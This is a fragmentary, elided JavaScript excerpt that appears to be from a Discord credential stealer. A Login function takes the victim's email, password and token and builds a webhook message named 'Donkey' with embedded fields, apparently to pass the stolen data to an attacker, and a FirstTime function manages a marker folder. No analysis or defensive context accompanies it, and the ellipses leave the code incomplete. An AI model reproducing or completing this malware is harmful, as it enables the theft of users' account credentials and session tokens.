...
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Donkey"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Donkey"));
...
function Login(email, password, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
            username: "Donkey",
            content: "",
            avatar_url: "https://c.tenor.com/COwudY0PrCcAAAAC/discord-logo-discord.gif",
            embeds: [
                {
                    "color": 5814783,
                    "fields": [
